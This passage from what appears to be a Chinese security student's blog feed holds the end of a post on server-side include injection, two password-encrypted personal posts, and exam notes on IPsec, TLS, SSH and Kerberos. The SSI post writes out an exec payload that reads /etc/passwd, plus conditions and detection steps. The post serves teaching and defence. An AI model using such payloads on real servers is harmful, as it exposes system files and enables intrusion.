cmd=”文件名称”–&gt;</p><!--#exec cmd="cat /etc/passwd"--><p>&lt;!–#exec cgi=”文件名称”–&gt;</p><p>&lt;!–#exec cgi=”/cgi-bin/access_log.cgi”–&gt;</p><p>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。</p><h3 id="设置SSI信息显示格式-lt-config-gt-如文件制作日期-大小显示方式"><a href="#设置SSI信息显示格式-lt-config-gt-如文件制作日期-大小显示方式" class="headerlink" title="设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)"></a>设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)</h3><h3 id="高级SSI可设置变量使用if条件语句。"><a href="#高级SSI可设置变量使用if条件语句。" class="headerlink" title="高级SSI可设置变量使用if条件语句。"></a>高级SSI可设置变量使用if条件语句。</h3><h1 id="SSII"><a href="#SSII" class="headerlink" title="SSII"></a>SSII</h1><p>在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，服务器又开启了ssi支持的话就会存在SSI漏洞。</p><p>总而言之，就是在web服务器端开启SSI的情况下，在HTML页面中嵌入指令或脚本，最终得到服务端的信息。</p><h2 id="SSI注入条件"><a href="#SSI注入条件" class="headerlink" title="SSI注入条件"></a>SSI注入条件</h2><p>web服务端开启SSI功能</p><p>未对SSI语法进行过滤</p><p>返回的页面中包含用户输入</p><h2 id="SSII的检测与防御"><a href="#SSII的检测与防御" class="headerlink" title="SSII的检测与防御"></a>SSII的检测与防御</h2><p>识别页面是否包含.stm,.shtm和.shtml后缀</p><p>判断web服务器是否开启SSI</p><p>测试过滤的字符</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;整理一下SSII(Server-Side-Includes Injection , 服务器端包含注入)，这种漏洞需要的环境较为严格，极其少见
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>阿弟的情诗</title>
    <link href="https://xytk0x0.github.io/2019/10/30/%E9%98%BF%E5%BC%9F%E7%9A%84%E6%83%85%E8%AF%97/"/>
    <id>https://xytk0x0.github.io/2019/10/30/阿弟的情诗/</id>
    <published>2019-10-30T07:40:39.000Z</published>
    <updated>2019-11-17T04:06:33.981Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0a0c40ce5d9cd0190424b9d118deee786e687122364b3970ea47aa7e3016fc68">aca38bb186dac9dbfd316f1936b294e90d4f025628123339878afb313413e9d0bb8ce14bdda46ca0b83d49e1811577ab11eebf86124d7345ec69a77172d5e0eb5be1ce79fdf2315186d043d77163930dc8aa06daeafb0fccce186cb0e622211196ee348cab2ae47c6c76506503fc0da1c2f822e950b88f0e2730e21baf6f4502a20660de45e034d8909e1e083b5c47f72811f096221065e7fd5c58a48df7b70b11464315a6d1d3fbf3db7cc6ffd6519853f588f92f472c61ff959f51ba67386dd76b659613027e6de36d622ee4517237ebdae03a3e15c367b48f2752eb48501820117d172f088c05e1f0fd3d075f7a46cad43b393da745c27ee5e3ea150e58468d794d1fad698dc66d94e1baed8ba14685012347e52b97b721b8df1eaa08efe12477286d9e87bcd14817ccf0ba71c16d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>网络安全协议复习</title>
    <link href="https://xytk0x0.github.io/2019/10/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0/"/>
    <id>https://xytk0x0.github.io/2019/10/28/网络安全协议复习/</id>
    <published>2019-10-28T07:02:47.000Z</published>
    <updated>2019-10-31T10:27:04.641Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近这一周心态有点崩，基本上没看别的东西。要考试了，随便记录一下吧。</p><hr><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="网络安全需求"><a href="#网络安全需求" class="headerlink" title="网络安全需求"></a>网络安全需求</h2><p>1、机密性(防止数据的未授权公开)</p><p>2、完整性(防止数据被篡改)</p><p>3、可控性</p><p>限制对网络资源（硬件和软件）和数据（存储和通信）的访问，其目标是组织未授权使用资源、未授权公开或修改数据，其要素包括：标识和鉴别、授权、决策以及执行。</p><p>4、不可否认性 </p><p>通信实体需对自己的行为负责。包含两层含义，一是发送方不能否认自己发送数据的行为；二是接收方不能否认自己接收数据的行为。</p><p>5、可用性</p><p>合法用户能够正常获取服务。</p><h2 id="网络安全协议的定义"><a href="#网络安全协议的定义" class="headerlink" title="网络安全协议的定义"></a>网络安全协议的定义</h2><p>可定义为基于密码学的通信协议。该含义包括以下两层含义：</p><p>1、网络安全协议是以密码学为基础；</p><p>2、网络安全协议也是通信协议。</p><h2 id="构建网络安全协议的组件"><a href="#构建网络安全协议的组件" class="headerlink" title="构建网络安全协议的组件"></a>构建网络安全协议的组件</h2><p>包括加密与解密、消息摘要、消息验证码、数字签名、密钥管理</p><h3 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h3><p>对称加密算法：AES、三重数据加密标准(Triple DES,3DES)、RC2、RC4、国际数据加密算法(IDEA)</p><p>公钥加密算法：RSA、数字签名算法(DSA)、ElGamal、椭圆曲线密码(ECC)</p><h3 id="消息摘要"><a href="#消息摘要" class="headerlink" title="消息摘要"></a>消息摘要</h3><p>一段数据的摘要是表征该数据特征的字符串，获取数据摘要的功能通常由散列函数完成。</p><h4 id="散列函数的三个特性"><a href="#散列函数的三个特性" class="headerlink" title="散列函数的三个特性"></a>散列函数的三个特性</h4><p>1、映射分布均匀性和差分分布均匀性</p><p>实质是必须使输入中每一个比特信息，尽量均匀的反映到输出的每一个比特上面；输出中的每一个比特，都是输入中尽可能多比特的信息一起作用的结果。</p><p>2、单向性(不可伪造)</p><p>3、抗冲突性</p><p>在统计上无法产生两个散列值相同的预映射。</p><hr><h1 id="IP层安全IPsec"><a href="#IP层安全IPsec" class="headerlink" title="IP层安全IPsec"></a>IP层安全IPsec</h1><p>IPsec标准包含多个协议。包括互联网安全关联与密钥管理协议(ISAKMP)和互联网密钥交换(IKE)这两个交换协议，以及数据封装处理协议的认证首部(AH)和封装安全载荷(ESP)这两个数据封装协议。</p><h2 id="协议组成："><a href="#协议组成：" class="headerlink" title="协议组成："></a>协议组成：</h2><p>IPsec由一系列安全协议组成。把IP通信过程分成协商和数据交互两个阶段。在协商阶段，通信双方互相认证对方的身份，并根据安全策略协商使用的加密、认证算法，生成共享的会话密钥；在数据交互阶段，通信双方利用协商好的算法和密钥对数据进行安全处理以实现IPsec的各种安全功能。</p><img src="/2019/10/28/网络安全协议复习/0.png" title="XYTK"><p><strong>认证首部AH</strong>提供三类安全服务：数据完整性、数据源发认证和抗重放攻击</p><p><strong>封装安全载荷ESP</strong>提供五类安全服务：数据完整性、数据源发认证、抗重放攻击、机密性和有限的传输流机密性</p><h2 id="典型应用"><a href="#典型应用" class="headerlink" title="典型应用"></a>典型应用</h2><p>1、端到端的安全</p><p>2、基本VPN支持</p><p>3、保护移动用户访问内部网</p><p>4、嵌套式隧道</p><hr><h1 id="传输层安全SSL和TLS"><a href="#传输层安全SSL和TLS" class="headerlink" title="传输层安全SSL和TLS"></a>传输层安全SSL和TLS</h1><p>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层与应用层之间对网络连接进行加密。</p><hr><h1 id="会话安全SSH"><a href="#会话安全SSH" class="headerlink" title="会话安全SSH"></a>会话安全SSH</h1><p>Secure Shell(SSH) 是由 IETF(The Internet Engineering Task Force) 制定的建立在应用层基础上的安全网络协议。它是专为远程登录会话(甚至可以用Windows远程登录Linux服务器进行文件互传)和其他网络服务提供安全性的协议，可有效弥补网络中的漏洞。目前已经成为Linux系统的标准配置。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的， 就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式， 就是“中间人”冒充真正的服务器接收你传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。</p><hr><h1 id="认证协议Kerberos"><a href="#认证协议Kerberos" class="headerlink" title="认证协议Kerberos"></a>认证协议Kerberos</h1><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。认证过程具体如下：客户机向认证服务器（AS）发送请求，要求得到某服务器的证书，然后 AS 的响应包含这些用客户端密钥加密的证书。证书的构成为： 1) 服务器 “ticket” ； 2) 一个临时加密密钥（又称为会话密钥 “session key”） 。客户机将 ticket （包括用服务器密钥加密的客户机身份和一份会话密钥的拷贝）传送到服务器上。会话密钥可以（现已经由客户机和服务器共享）用来认证客户机或认证服务器，也可用来为通信双方以后的通讯提供加密服务，或通过交换独立子会话密钥为通信双方提供进一步的通信加密服务。上述认证交换过程需要只读方式访问 Kerberos 数据库。但有时，数据库中的记录必须进行修改，如添加新的规则或改变规则密钥时。修改过程通过客户机和第三方 Kerberos 服务器（Kerberos 管理器 KADM）间的协议完成。有关管理协议在此不作介绍。另外也有一种协议用于维护多份 Kerberos 数据库的拷贝，这可以认为是执行过程中的细节问题，并且会不断改变以适应各种不同数据库技术。Kerberos又指麻省理工学院为这个协议开发的一套计算机网络安全系统。系统设计上采用客户端/服务器结构与DES加密技术，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。可以用于防止窃听、防止replay攻击、保护数据完整性等场合，是一种应用对称密钥体制进行密钥管理的系统。Kerberos的扩展产品也使用公开密钥加密方法进行认证。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近这一周心态有点崩，基本上没看别的东西。要考试了，随便记录一下吧。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; 
      
    
    </summary>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>没有真正的感同身受</title>
    <link href="https://xytk0x0.github.io/2019/10/27/%E6%B2%A1%E6%9C%89%E7%9C%9F%E6%AD%A3%E7%9A%84%E6%84%9F%E5%90%8C%E8%BA%AB%E5%8F%97/"/>
    <id>https://xytk0x0.github.io/2019/10/27/没有真正的感同身受/</id>
    <published>2019-10-27T05:58:36.000Z</published>
    <updated>2019-12-06T06:21:13.634Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dc624f33d5143fc966a1601986553e47df3c3e0af80227d6672ee4cdf31521fe"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
</feed>
